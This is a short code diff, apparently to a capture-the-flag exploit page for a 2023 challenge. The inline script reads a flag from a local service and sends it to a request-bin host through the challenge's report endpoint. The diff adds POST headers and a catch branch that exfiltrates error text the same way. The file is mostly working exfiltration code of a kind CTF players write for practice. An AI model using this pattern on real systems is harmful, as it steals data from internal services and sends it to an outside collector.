@@ -7,9 +7,17 @@
 <body>
   
 <script>
-  fetch("http://[::1]:3000/flag").then(data => data.text()).then((data) => {
+  fetch("http://localhost:3000/flag").then(data => data.text()).then((data) => {
     fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
       body: "url=https://enbit6i3l2ra4.x.pipedream.net/" + data,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      method: "POST"
+    });
+  }).catch((error) => {
+    fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
+      body: "url=https://enbit6i3l2ra4.x.pipedream.net/" + error.toString(),
       headers: {
         "Content-Type": "application/x-www-form-urlencoded"
       },
